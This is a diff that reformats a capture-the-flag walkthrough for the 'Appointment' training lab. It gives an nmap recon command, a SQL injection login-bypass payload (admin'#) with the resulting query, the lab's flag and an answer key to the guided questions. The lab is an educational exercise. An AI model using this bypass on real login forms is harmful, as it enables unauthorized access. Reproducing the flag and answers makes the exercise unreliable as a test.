@@ -1,62 +1,77 @@
 # Appointment
 
-- **Category**: Starting Point - Tier 1
-- **Difficulty**: Very Easy
-- **Tags**: Web, Databases, Injection, Apache, MariaDB, PHP, SQL, Reconnaissance, SQL Injection
-- **Tools**:
+|            |                                                                              |
+|------------|------------------------------------------------------------------------------|
+| Track      | Starting Point - Tier 1                                                      |
+| Difficulty | Very Easy                                                                    |
+| OS         | Linux                                                                        |
+| Tags       | Web, Databases, Injection, Apache, MariaDB, PHP, SQL, Reconnaissance, SQLi   |
+| Tools      | `nmap`, browser                                                              |
 
+## Summary
 
-# Walkthrough
+A PHP login page backed by MySQL. The username field is concatenated straight
+into the SQL query without escaping, so a comment-injection payload bypasses
+the password check entirely.
 
-## Task 1: What does the acronym SQL stand for?
+## Recon
 
-> **Answer**: Structured Query Language
+```bash
+nmap -p 80 -sV <IP>
+```
 
-## Task 2: What is one of the most common type of SQL vulnerabilities?
+```
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+```
 
-> **Answer**: SQL Injection
+Browsing to the site lands on a login form at `/`.
 
-## Task 3: What is the 2021 OWASP Top 10 classification for this vulnerability?
+## Exploitation
 
-[OWASP - A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/)
+Assuming the backend builds the login query like this:
 
-> **Answer**: A03:2021 - Injection
+```sql
+SELECT * FROM users WHERE username = '<username>' AND password = '<password>'
+```
 
-## Task 4: What does Nmap report as the service and version that are running on port 80 of the target?
+we can inject a comment in the username field to comment out the rest of the
+clause:
 
-Command: `nmap <IP> -p 80 -sV`
+- **Username**: `admin'#`
+- **Password**: anything
 
-> **Answer**:Apache httpd 2.4.38 ((Debian)) 
+The server runs:
 
-## Task 5: What is the standard port used for the HTTPS protocol?
+```sql
+SELECT * FROM users WHERE username = 'admin'#' AND password = '...'
+```
 
-> **Answer**: 443
+Everything from `#` onward is treated as a SQL comment, so the password check
+disappears and we land on the admin page with the flag.
 
-## Task 6: What is a folder called in web-application terminology?
+## Flag
 
-> **Answer**: directory
+```
+e3d0796d002a446c0e622226f42e9672
+```
 
-## Task 7: What is the HTTP response code is given for 'Not Found' errors?
+## References
 
-> **Answer**: 404
+- [OWASP A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)
 
-## Task 8: Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?
+## Guided Tasks
 
-> **Answer**: dir
-
-## Task 9: What single character can be used to comment out the rest of a line in MySQL?
-
-> **Answer**: #
-
-## Task 10: If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?
-
-Assuming the login credential check is done like so: `SELECT * FROM users WHERE username = '<username>' AND password = '<password>'`, we can use a comment to ignore the password check:
- - Username: `admin'#`
- - Passowrd: `anything`
-
-
-> **Answer**: Congratulations
-
-## Submit Root Flag
-
-> **Answer**: e3d0796d002a446c0e622226f42e9672
+| #  | Question | Answer |
+|----|----------|--------|
+| 1  | What does the acronym SQL stand for? | Structured Query Language |
+| 2  | What is one of the most common type of SQL vulnerabilities? | SQL Injection |
+| 3  | What is the 2021 OWASP Top 10 classification for this vulnerability? | A03:2021 - Injection |
+| 4  | What does Nmap report as the service and version that are running on port 80 of the target? | Apache httpd 2.4.38 ((Debian)) |
+| 5  | What is the standard port used for the HTTPS protocol? | 443 |
+| 6  | What is a folder called in web-application terminology? | directory |
+| 7  | What is the HTTP response code is given for 'Not Found' errors? | 404 |
+| 8  | Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains? | dir |
+| 9  | What single character can be used to comment out the rest of a line in MySQL? | # |
+| 10 | If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned? | Congratulations |
+| Flag | Submit Root Flag | `e3d0796d002a446c0e622226f42e9672` |
